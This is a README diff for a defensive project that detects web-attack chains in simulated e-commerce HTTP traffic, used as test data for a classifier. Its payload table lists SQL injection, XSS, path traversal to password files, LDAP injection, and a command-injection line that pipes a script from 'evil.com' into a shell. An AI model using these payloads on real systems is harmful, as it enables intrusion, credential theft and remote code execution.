@@ -24,9 +24,10 @@ a Kafka pipeline with distributed tracing. Runs fully offline — no API keys re
 5. [Docker Setup](#-docker-setup)
 6. [Quick Start — Kafka Streaming Pipeline](#-quick-start--kafka-streaming-pipeline)
 7. [Quick Start — Flask Web App](#-quick-start--flask-web-app)
-8. [Attack Chain Detection](#-attack-chain-detection)
-9. [Results & Statistics](#-results--statistics)
-10. [Project Structure](#-project-structure)
+8. [Data Generation](#-data-generation-notebook-1--producer)
+9. [Attack Chain Detection](#-attack-chain-detection)
+10. [Results & Statistics](#-results--statistics)
+11. [Project Structure](#-project-structure)
 
 ---
 
@@ -246,6 +247,71 @@ python run.py            # starts Flask at http://localhost:5000
 ```
 
 Or double-click **`run.bat`**.
+
+---
+
+## 🔄 Data Generation (Notebook 1 — Producer)
+
+The producer simulates realistic HTTP traffic against a fictional e-commerce application
+(`tienda1`) that mirrors the structure of the CSIC 2010 dataset the classifier was trained on.
+This keeps the request format familiar to the model while using **novel payloads** the
+classifier has never seen, giving honest confidence scores.
+
+### Traffic Mix
+
+300 HTTP requests are generated per run, split across three session types:
+
+| Type | Share | Description |
+|---|---|---|
+| Normal sessions | 60% | 2–4 legitimate requests sharing a session cookie (browse, search, login, checkout) |
+| Attack chains | 25% | 1–2 normal warmup requests followed by 2–3 escalating attacks on the same cookie |
+| Random one-offs | 15% | Single anomalous request with no session linkage |
+
+### Normal Request Types
+
+Normal requests target real CSIC endpoints with realistic parameters:
+
+| Endpoint | Method | Example |
+|---|---|---|
+| `publico/anadir.jsp` | GET | `?id=12&nombre=Vino+Rioja&precio=150&cantidad=2` |
+| `publico/buscar.jsp` | GET | `?id=5&nombre=Aceite+Oliva&precio=200&cantidad=1` |
+| `publico/autenticar.jsp` | POST | `correo=juan@mail.com&password=abc123` |
+| `publico/pagar.jsp` | POST | `tarjeta=4111111111111111&mes=12&anio=2027` |
+
+### Attack Payloads
+
+Each attack type uses a pool of distinct payloads injected into URL parameters or the request body:
+
+| Attack Type | Example Payload |
+|---|---|
+| SQL Injection | `' OR 1=1 LIMIT 1--` · `1 UNION ALL SELECT table_name FROM information_schema.tables--` |
+| XSS | `<details open ontoggle=alert(1)>` · `<input autofocus onfocus=alert(document.domain)>` |
+| Command Injection | `; curl http://evil.com/shell.sh \| sh` · `\| net user` |
+| Path Traversal | `....//....//etc/shadow` · `%2e%2e%2f%2e%2e%2fetc%2fpasswd` |
+| LDAP Injection | `)(cn=*))(|(cn=*` · `admin)(&(password=*))` |
+| Buffer Overflow | 400–800 repeated characters |
+| Parameter Tampering | Negative prices (`precio=-1`) · extreme quantities (`cantidad=-99999`) |
+
+### Attack Chain Sequences
+
+Attack chains follow realistic MITRE ATT&CK kill-chain progressions. Each stage shares the
+same session cookie so the chain detector can correlate them:
+
+| Chain | Stages |
+|---|---|
+| Recon → Credential Access | `path_traversal → sql_injection` |
+| Auth Bypass → RCE | `sql_injection → command_injection` |
+| Auth Bypass → Data Manipulation | `sql_injection → parameter_tampering` |
+| Full Kill Chain | `path_traversal → sql_injection → command_injection` |
+| Client Attack → Escalation | `xss → command_injection` |
+| Recon → Directory Attack | `path_traversal → ldap_injection` |
+
+### Session Tracking
+
+Each session is assigned a unique `JSESSIONID` cookie. Attack chain sessions begin with
+1–2 legitimate requests (to simulate an attacker blending in) before the escalating
+attack payloads begin. The consumer's sliding window tracks attack types per cookie and
+raises a chain alert when 2+ distinct attack types appear within 120 seconds.
 
 ---
 
